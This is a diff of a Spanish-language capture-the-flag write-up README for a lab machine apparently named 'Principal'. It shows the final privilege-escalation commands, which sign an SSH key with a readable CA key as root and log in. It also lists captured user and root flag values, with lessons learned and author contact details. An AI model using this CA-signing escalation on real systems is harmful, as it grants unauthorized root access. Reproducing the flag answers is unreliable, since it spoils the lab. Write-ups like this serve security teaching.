@@ -86,3 +86,46 @@ cd /opt/principal/ssh
 ssh-keygen -t rsa -b 4096 -f /tmp/rootkey -N ""
 ssh-keygen -s ca -I "exploit" -n root /tmp/rootkey.pub
 ssh -i /tmp/rootkey root@localhost
+
+🏆 Flags obtenidas
+Flag	Valor
+🟢 User flag	ae03f16d9cc263fb8e30ca26e7f3c03c
+🔴 Root flag	d877755bf789aedddd17aec5865b3092
+📸 Evidencia gráfica
+<div align="center"> <img src="./principal.png" alt="Dashboard de Principal" width="600"/> <br/> <sub>Panel de administración accedido con el token JWE forjado.</sub> </div>
+📝 Lecciones aprendidas
+
+    Configuración de librerías JWT/JWE: nunca confiar en los valores por defecto; validar algoritmos permitidos y rotación de claves.
+
+    Protección de claves privadas de CA: no deben ser legibles por cuentas de servicio o grupos no privilegiados.
+
+    Autenticación por certificado SSH: es muy segura si la CA se gestiona en un entorno aislado y con controles estrictos.
+
+📄 Licencia
+
+MIT – uso libre para fines educativos y de investigación.
+🤝 Contribuciones
+
+Las sugerencias y mejoras son bienvenidas. Abre un issue o un pull request.
+
+⭐ Si este contenido te resultó útil, no olvides darle una estrella.
+📬 Contacto
+
+¿Preguntas, comentarios o deseas conectar profesionalmente?
+🔗 Visita mi portafolio de enlaces: https://linktr.ee/cosmenoide
+
+*Write-up realizado por Cosm3No1de – Ethical Hacker & Cybersecurity Enthusiast.*
+text
+
+
+### ✨ Mejoras visuales incorporadas:
+
+- **Banner centrado** con la imagen `principal.png` (ancho 800px).
+- **Badges** de estado, dificultad, plataforma y autor.
+- **Emojis** en títulos y tabla de vista rápida.
+- **Tabla de tecnologías** para claridad.
+- **Estructura con índice** para navegación.
+- **Código resaltado** (bash) y bloques de comandos.
+- **Contacto final** con enlace a `https://linktr.ee/cosmenoide`.
+
+
